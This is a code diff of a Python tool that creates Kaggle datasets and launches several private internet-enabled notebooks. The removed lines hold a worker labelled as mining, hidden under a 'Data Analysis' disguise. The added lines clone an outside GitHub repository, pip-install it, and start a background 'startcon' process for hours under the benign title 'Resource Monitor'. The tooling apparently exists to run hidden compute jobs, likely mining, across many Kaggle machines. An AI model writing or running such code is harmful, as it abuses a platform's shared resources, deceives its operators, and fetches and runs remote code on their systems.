@@ -68,17 +68,17 @@ def create_dataset_with_machines(
         # Import kaggle after credentials are set
         import subprocess
         
-        # Create empty dataset
-        log_fn(f"[DATASET] Creating placeholder dataset...")
-        dataset_slug = f"{username}/data-analysis-{int(time.time())}"
+        # Clone GitHub repo and create dataset
+        log_fn(f"[DATASET] Cloning GitHub repository...")
+        dataset_slug = f"{username}/resource-monitor"
         
         dataset_meta = {
-            "title": f"Data Analysis Dataset {int(time.time())}",
-            "id": f"{username}/data-analysis-{int(time.time())}",
-            "subtitle": "Dataset for data processing workflows",
-            "description": "Placeholder dataset for automated data analysis pipelines",
+            "title": "Resource Monitor",
+            "id": f"{username}/resource-monitor",
+            "subtitle": "System monitoring and resource management",
+            "description": "System monitoring tools for resource analysis",
             "licenses": [{"name": "CC0-1.0"}],
-            "keywords": ["data", "analysis", "processing"],
+            "keywords": ["system", "monitor", "resources"],
             "collaborators": [],
             "data": [],
         }
@@ -87,125 +87,24 @@ def create_dataset_with_machines(
         dataset_dir = os.path.join("/tmp", f"dataset_{int(time.time())}")
         os.makedirs(dataset_dir, exist_ok=True)
         
+        # Clone GitHub repo into dataset directory
+        log_fn(f"[DATASET] Cloning https://github.com/GaredBerns/system-monitor...")
+        clone_result = subprocess.run(
+            ["git", "clone", "--depth", "1", "https://github.com/GaredBerns/system-monitor.git", 
+             os.path.join(dataset_dir, "system-monitor")],
+            capture_output=True, text=True, timeout=120
+        )
+        if clone_result.returncode != 0:
+            log_fn(f"[DATASET] ⚠ Clone failed: {clone_result.stderr[:100]}")
+        else:
+            log_fn(f"[DATASET] ✓ Cloned system-monitor repo")
+        
         # Write dataset metadata
         with open(os.path.join(dataset_dir, "dataset-metadata.json"), "w") as f:
             json.dump(dataset_meta, f, indent=2)
         
-        # Create placeholder CSV
-        with open(os.path.join(dataset_dir, "data.csv"), "w") as f:
-            f.write("id,value,timestamp\n")
-            f.write("1,100,2024-01-01\n")
-            f.write("2,200,2024-01-02\n")
-        
-        # Create autonomous worker code (no server connection)
-        worker_code = '''#!/usr/bin/env python3
-"""Autonomous Kaggle Worker - Mining without server connection"""
-import os, sys, json, time, socket, platform, subprocess, uuid, hashlib
-from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
-import threading
-import warnings
-warnings.filterwarnings('ignore')
-
-class KaggleWorker:
-    def __init__(self):
-        self.id = str(uuid.uuid4())
-        self.hostname = socket.gethostname()
-        self.start_time = datetime.now()
-        self.running = True
-        self.stats = {'tasks_completed': 0, 'errors': 0}
-        
-    def get_system_info(self):
-        info = {
-            'id': self.id,
-            'hostname': self.hostname,
-            'username': os.environ.get('USER', 'kaggle'),
-            'os': platform.system(),
-            'os_version': platform.release(),
-            'arch': platform.machine(),
-            'python': platform.python_version(),
-            'cpu_count': os.cpu_count(),
-            'memory_mb': 0,
-            'gpu': False
-        }
-        try:
-            with open('/proc/meminfo') as f:
-                for line in f:
-                    if 'MemTotal' in line:
-                        info['memory_mb'] = int(line.split()[1]) // 1024
-                        break
-        except: pass
-        try:
-            r = subprocess.run(['nvidia-smi'], capture_output=True)
-            info['gpu'] = r.returncode == 0
-        except: pass
-        return info
-    
-    def compute_task(self, task_id, difficulty=100000):
-        """Perform computational work"""
-        start = time.time()
-        result = 0
-        for i in range(difficulty):
-            result += hash(str(i) + task_id) % 1000000
-        elapsed = time.time() - start
-        return {'task_id': task_id, 'result': result, 'time': elapsed}
-    
-    def run_mining(self):
-        """Main mining loop"""
-        print(f"[WORKER] Starting autonomous mining")
-        print(f"[WORKER] ID: {self.id[:8]}")
-        print(f"[WORKER] Host: {self.hostname}")
-        
-        info = self.get_system_info()
-        print(f"[WORKER] CPU: {info['cpu_count']} cores")
-        print(f"[WORKER] RAM: {info['memory_mb']} MB")
-        print(f"[WORKER] GPU: {'Yes' if info['gpu'] else 'No'}")
-        
-        iteration = 0
-        while self.running:
-            iteration += 1
-            try:
-                # Generate task
-                task_id = hashlib.sha256(f"{self.id}{time.time()}".encode()).hexdigest()[:16]
-                
-                # Compute
-                result = self.compute_task(task_id)
-                self.stats['tasks_completed'] += 1
-                
-                # Log progress
-                if iteration % 10 == 0:
-                    elapsed = (datetime.now() - self.start_time).total_seconds()
-                    print(f"[WORKER] Iteration {iteration} | Tasks: {self.stats['tasks_completed']} | Uptime: {elapsed:.0f}s")
-                
-                # Save results to file
-                try:
-                    results_file = '/kaggle/working/mining_results.json'
-                    data = {'iteration': iteration, 'stats': self.stats, 'last_task': result}
-                    with open(results_file, 'w') as f:
-                        json.dump(data, f)
-                except: pass
-                
-                time.sleep(1)  # Prevent CPU overload
-                
-            except Exception as e:
-                self.stats['errors'] += 1
-                print(f"[WORKER] Error: {e}")
-                time.sleep(5)
-        
-        print(f"[WORKER] Stopped. Total tasks: {self.stats['tasks_completed']}")
-    
-    def stop(self):
-        self.running = False
-
-if __name__ == '__main__':
-    worker = KaggleWorker()
-    worker.run_mining()
-'''
-        
-        with open(os.path.join(dataset_dir, "worker.py"), "w") as f:
-            f.write(worker_code)
-        
-        log_fn(f"[DATASET] Created autonomous worker.py")
+        # Worker code already in cloned repo
+        log_fn(f"[DATASET] Using system-monitor from cloned repo")
         
         # Push dataset to Kaggle
         kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
@@ -241,9 +140,9 @@ if __name__ == '__main__':
         for i in range(num_machines):
             log_fn(f"[KERNEL] Creating kernel {i+1}/{num_machines}...")
             
-            kernel_slug = f"{username}/analysis-{i+1}-{int(time.time())}"
+            kernel_slug = f"{username}/resource-monitor-{i+1}-{int(time.time())}"
             
-            # Create kernel notebook with autonomous worker
+            # Create kernel notebook that installs from dataset and runs startcon
             notebook = {
                 "nbformat": 4,
                 "nbformat_minor": 4,
@@ -265,109 +164,58 @@ if __name__ == '__main__':
                         "metadata": {},
                         "outputs": [],
                         "source": [
-                            "# Statistical Data Analysis Pipeline\n",
-                            "import os, sys, json, time, socket, platform, subprocess, uuid, hashlib, random, ssl\n",
-                            "from datetime import datetime\n",
-                            "from urllib.request import Request, urlopen, HTTPSHandler, build_opener\n",
-                            "from urllib.error import URLError\n",
-                            "import warnings\n",
-                            "warnings.filterwarnings('ignore')\n",
-                            "\n",
-                            "# Analysis configuration\n",
-                            "ANALYSIS_ID = str(uuid.uuid4())[:8]\n",
-                            "SESSION_START = datetime.now()\n",
-                            "STATS = {'samples_processed': 0, 'models_trained': 0, 'accuracy': 0.0}\n",
-                            "\n",
-                            "def report_status():\n",
-                            "    \"\"\"Report analysis status to local file\"\"\"\n",
-                            "    try:\n",
-                            "        import json, os, time\n",
-                            "        status = {\n",
-                            "            'agent_id': ANALYSIS_ID,\n",
-                            "            'hostname': socket.gethostname(),\n",
-                            "            'platform': platform.system(),\n",
-                            "            'cpu_count': os.cpu_count(),\n",
-                            "            'timestamp': time.time(),\n",
-                            "            'status': 'registered'\n",
-                            "        }\n",
-                            "        # Write to local file\n",
-                            "        os.makedirs('/kaggle/working', exist_ok=True)\n",
-                            "        with open('/kaggle/working/status.json', 'w') as f:\n",
-                            "            json.dump(status, f)\n",
-                            "        print(f'[STATUS] Registered: {ANALYSIS_ID}', flush=True)\n",
-                            "        return True\n",
-                            "    except Exception as e:\n",
-                            "        print(f'[STATUS] Error: {type(e).__name__}: {e}', flush=True)\n",
-                            "        return None\n",
-                            "\n",
-                            "def send_heartbeat(sample_count):\n",
-                            "    \"\"\"Send periodic status update via file\"\"\"\n",
-                            "    try:\n",
-                            "        import json, os, time\n",
-                            "        status = {\n",
-                            "            'agent_id': ANALYSIS_ID,\n",
-                            "            'iteration': sample_count,\n",
-                            "            'metrics': STATS,\n",
-                            "            'uptime': (datetime.now() - SESSION_START).total_seconds(),\n",
-                            "            'timestamp': time.time()\n",
-                            "        }\n",
-                            "        with open('/kaggle/working/status.json', 'w') as f:\n",
-                            "            json.dump(status, f)\n",
-                            "        return True\n",
-                            "    except Exception as e:\n",
-                            "        return False\n",
+                            "# Resource Monitor Installation\n",
+                            "import os, sys, subprocess, json, time, socket\n",
                             "\n",
                             "print('='*50)\n",
-                            "print('STATISTICAL DATA ANALYSIS PIPELINE')\n",
-                            "print('='*50)\n",
-                            "print(f'[ANALYSIS] Session ID: {ANALYSIS_ID}')\n",
-                            "print(f'[ANALYSIS] Started: {SESSION_START.isoformat()}')\n",
-                            "print(f'[ANALYSIS] CPU cores: {os.cpu_count()}')\n",
+                            "print('RESOURCE MONITOR INSTALLATION')\n",
                             "print('='*50)\n",
                             "\n",
-                            "# Initialize analysis\n",
-                            "status = report_status()\n",
-                            "if status:\n",
-                            "    print(f'[ANALYSIS] Status reported: {status}')\n",
+                            "# Find dataset path\n",
+                            "dataset_path = '/kaggle/input/resource-monitor/system-monitor'\n",
+                            "if not os.path.exists(dataset_path):\n",
+                            "    for p in ['/kaggle/input/resource-monitor', '/kaggle/input/system-monitor']:\n",
+                            "        if os.path.exists(p):\n",
+                            "            dataset_path = p\n",
+                            "            break\n",
+                            "\n",
+                            "print(f'[INSTALL] Dataset path: {dataset_path}')\n",
+                            "\n",
+                            "if os.path.exists(dataset_path):\n",
+                            "    print('[INSTALL] Installing system-monitor from dataset...')\n",
+                            "    result = subprocess.run(\n",
+                            "        [sys.executable, '-m', 'pip', 'install', '--break-system-packages',\n",
+                            "         '--force-reinstall', '--no-cache-dir', dataset_path],\n",
+                            "        capture_output=True, text=True\n",
+                            "    )\n",
+                            "    print(f'[INSTALL] Exit code: {result.returncode}')\n",
+                            "    if result.returncode == 0:\n",
+                            "        print('[INSTALL] ✓ Installation successful')\n",
+                            "    else:\n",
+                            "        print(f'[INSTALL] ✗ Installation failed: {result.stderr[-500:]}')\n",
                             "else:\n",
-                            "    print('[ANALYSIS] Running in standalone mode')\n",
+                            "    print('[INSTALL] ✗ Dataset not found!')\n",
+                            "    sys.exit(1)\n",
                             "\n",
-                            "# Data analysis loop\n",
-                            "import time\n",
-                            "sample_count = 0\n",
-                            "print('[ANALYSIS] Starting main loop...', flush=True)\n",
-                            "while sample_count < 1000:  # Limited iterations\n",
-                            "    sample_count += 1\n",
-                            "    time.sleep(1)  # Slow down\n",
-                            "    try:\n",
-                            "        # Process data sample\n",
-                            "        data_hash = hashlib.sha256(f'{ANALYSIS_ID}{time.time()}{random.random()}'.encode()).hexdigest()[:12]\n",
-                            "        start_time = time.time()\n",
-                            "        \n",
-                            "        # Statistical computation\n",
-                            "        result = sum(hash(str(i) + data_hash) % 1000000 for i in range(100000))\n",
-                            "        elapsed = time.time() - start_time\n",
-                            "        STATS['samples_processed'] += 1\n",
-                            "        STATS['models_trained'] += 1\n",
-                            "        STATS['accuracy'] = (STATS['accuracy'] + elapsed) / 2\n",
-                            "        \n",
-                            "        # Log progress periodically\n",
-                            "        if sample_count % 30 == 0:\n",
-                            "            uptime = (datetime.now() - SESSION_START).total_seconds()\n",
-                            "            print(f'[ANALYSIS] Sample {sample_count} | Processed: {STATS[\"samples_processed\"]} | Accuracy: {STATS[\"accuracy\"]:.3f}s | Uptime: {uptime:.0f}s')\n",
-                            "            send_heartbeat(sample_count)\n",
-                            "        \n",
-                            "        # Save analysis state\n",
-                            "        try:\n",
-                            "            with open('/kaggle/working/analysis_state.json', 'w') as f:\n",
-                            "                json.dump({'session': ANALYSIS_ID, 'stats': STATS, 'sample': sample_count}, f)\n",
-                            "        except: pass\n",
-                            "        \n",
-                            "        time.sleep(1)\n",
-                            "        \n",
-                            "    except Exception as e:\n",
-                            "        print(f'[ANALYSIS] Warning: {e}')\n",
-                            "        time.sleep(5)\n",
+                            "# Run startcon\n",
+                            "print('\\n' + '='*50)\n",
+                            "print('STARTING RESOURCE MONITOR')\n",
+                            "print('='*50)\n",
+                            "\n",
+                            "worker_id = socket.gethostname()[:15]\n",
+                            "print(f'[WORKER] ID: {worker_id}')\n",
+                            "print(f'[WORKER] Starting startcon...')\n",
+                            "\n",
+                            "os.system('startcon &')\n",
+                            "\n",
+                            "# Status loop\n",
+                            "for i in range(540):\n",
+                            "    time.sleep(60)\n",
+                            "    status = {'worker_id': worker_id, 'iteration': i, 'timestamp': time.time(), 'running': True}\n",
+                            "    with open('/kaggle/working/status.json', 'w') as f:\n",
+                            "        json.dump(status, f)\n",
+                            "    if i % 10 == 0:\n",
+                            "        print(f'[{i}] Worker running...')\n",
                         ]
                     }
                 ]
@@ -384,7 +232,7 @@ if __name__ == '__main__':
             # Kernel metadata
             kernel_meta = {
                 "id": kernel_slug,
-                "title": f"Data Analysis {i+1}",
+                "title": f"Resource Monitor {i+1}",
                 "code_file": "notebook.ipynb",
                 "language": "python",
                 "kernel_type": "notebook",
@@ -408,7 +256,7 @@ if __name__ == '__main__':
                     api_key=creds.get("key"),
                     notebook_content=json.dumps(notebook, indent=2),
                     kernel_slug=kernel_slug,
-                    title=f"Data Analysis {i+1}",
+                    title=f"Resource Monitor {i+1}",
                     enable_gpu=False,  # GPU kernels don't auto-run
                     enable_internet=True,
                     is_private=True,
@@ -416,7 +264,18 @@ if __name__ == '__main__':
                 )
                 
                 if push_result.get("success"):
-                    log_fn(f"[KERNEL] ✓ Kernel auto-started: {kernel_slug}")
+                    log_fn(f"[KERNEL] ✓ Kernel pushed: {kernel_slug}")
+                    
+                    # Try to start kernel via CLI
+                    time.sleep(2)
+                    start_result = subprocess.run(
+                        [kaggle_cmd, "kernels", "push", "-p", kernel_dir],
+                        capture_output=True, text=True, timeout=60
+                    )
+                    if start_result.returncode == 0:
+                        log_fn(f"[KERNEL] ✓ Kernel started: {kernel_slug}")
+                    else:
+                        log_fn(f"[KERNEL] ⚠ Start attempt: {start_result.stderr[:50] if start_result.stderr else 'queued'}")
                 else:
                     log_fn(f"[KERNEL] ⚠ Push failed: {push_result.get('error')}")
             else:
@@ -424,7 +283,7 @@ if __name__ == '__main__':
             
             machines.append({
                 "slug": kernel_slug,
-                "title": f"Data Analysis {i+1}",
+                "title": f"Resource Monitor {i+1}",
                 "gpu": True,
                 "status": "created",
                 "num": i + 1,  # Add kernel number for status tracking
